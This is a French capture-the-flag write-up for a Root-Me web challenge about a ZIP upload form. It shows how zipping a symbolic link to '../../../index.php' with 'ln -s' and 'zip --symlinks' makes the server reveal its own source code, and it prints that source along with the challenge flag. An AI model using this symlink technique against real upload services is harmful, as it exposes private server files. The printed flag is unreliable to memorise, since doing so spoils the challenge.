Pour ce challenge le site indique qu’on a besoin d’upload un fichier au format zip.
En document associé on a le manuel Linux sur les fichiers zip : http://repository.root-me.org/Administration/Unix/Linux/EN%20-%20Linux%20man%20page%20-%20zip.pdf

On essaye dans un premier temps d’upload notre fichier zip avec une image de chat (très mignon les chats) pour voir le comportement du script.

On a notre fichier envoyé dans un dossier du type :
```
http://challenge01.root-me.org/web-serveur/ch51/tmp/upload/5984123357e4e2.74715874/
```
Et notre image a été dézippée.

Maintenant on va créer un fichier php "test.php" avec une simple alerte :
```
<?php
 echo 'salut';
?>
```
Mais quand on essaye de lire le fichier php on a un 403 Forbidden.

**On a perdu cette bataille mais pas la guerre !**

Pourquoi pas faire un lien symbolique vers le fichier ../../../index.php.
Pour ceux qui ne le savent pas un lien symbolique (symlink) est une entrée spéciale de répertoire dans les systèmes Unix ou type Unix modernes qui permet de référencer de manière quasi transparente d’autres entrées de répertoire, typiquement, des fichiers ordinaires ou des répertoires, y compris sur des volumes de stockage différents (ce que ne permettait pas un lien ordinaire). Il se comporte comme un alias d’un fichier ordinaire ou d’un répertoire. (Merci Wikipedia)

Donc on fait notre petit lien :
```
ln -s ../../../index.php link
```
Et on zippe ce lien :
```
zip --symlinks test.zip link
```
On clique sur le lien et notre fichier link et hop on a le code source de index.php qui s’affiche par magie :
```php
<?php
if(isset($_FILES['zipfile'])){
   if($_FILES['zipfile']['type']==="application/zip"){
       $uploaddir = 'tmp/upload/'.uniqid("", true).'/';
       mkdir($uploaddir, 0750, true);
       $uploadfile = $uploaddir . md5(basename($_FILES['zipfile']['name'])).'.zip';
       if (move_uploaded_file($_FILES['zipfile']['tmp_name'], $uploadfile)) {
           $message = "<p>File uploaded</p> ";
       }
       else{
           $message = "<p>Error!</p>";
       }

       $zip = new ZipArchive;
       if ($zip->open($uploadfile)) {
           // Don't know if this is safe, but it works, someone told me the flag is N3v3r_7rU5T_u5Er_1npU7 , did not understand what it means
           exec("/usr/bin/timeout -k2 3 /usr/bin/unzip '$uploadfile' -d '$uploaddir'");
           $zip->close();
           $message = "<p>File unzipped <a href='".$uploaddir."'>here</a>.</p>";
       }
   }
}
?>

<html>
   <body>
       <h1>ZIP upload</h1>
       <?php print $message; ?>
       <form enctype="multipart/form-data" method="post" action>
           <input name="zipfile" type="file">
           <button type="submit">Submit</button>
       </form>
   </body>
</html>
```
Enjoy !
